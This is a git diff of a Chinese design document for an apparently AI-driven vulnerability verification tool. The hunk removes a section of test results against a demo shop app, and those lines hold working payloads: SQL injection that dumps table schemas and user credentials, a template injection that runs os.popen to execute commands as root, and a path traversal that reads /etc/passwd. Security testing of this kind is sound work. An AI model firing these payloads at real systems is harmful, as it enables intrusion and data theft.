@@ -132,28 +132,6 @@
    - **相对路径解析**：MCP 读文件工具支持相对路径与文件名后缀回退，AI 不会因路径写错而找不到接口
 3. **判定与证据**：输出 `verdict`（confirmed/potential/false_positive）、`confidence`、`exploit_payload` 和完整证据链（基线 vs 攻击响应对比）
 
-**实测例子**（演示商店应用）：
-
-SQL 注入：
-
-| 请求 | 响应 | 结论 |
-|---|---|---|
-| `/?q=xyz`（基线） | 200 "No products found" | — |
-| `/?q='` | **500** SQL 语法错误 | 注入点确认 |
-| `/?q=' OR '1'='1` | 200，返回全部 21 个商品（含隐藏商品） | 过滤条件被绕过 |
-| `/?q=' UNION SELECT sql FROM sqlite_master--` | 泄露全部表结构 | schema 可读 |
-| `/?q=' UNION SELECT email\|\|':'\|password FROM user--` | 泄露用户凭据 | **数据窃取成功** |
-
-SSTI（多步攻击链 + 提权）：
-
-| 步骤 | 请求 | 响应 |
-|---|---|---|
-| 注册/登录 | POST /auth/register + /auth/login | 302，建立会话 |
-| 下单一 | notes=`{{7*7}}` | 回执页显示 **49**（模板表达式被执行） |
-| 提权 | notes=`{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` | 回执页显示 **uid=0(root)** |
-
-路径穿越（认证门禁）：登录 admin/admin123（seed 数据里的测试账户）后，`GET /admin/logs?path=/etc/passwd` 返回完整 passwd（432 字节 vs 基线日志 108 字节）。
-
 ### 4.1 判定结果收集
 
 AI 完成 Payload 构建与模拟攻击后，最终判定统一写回页面展示字段：
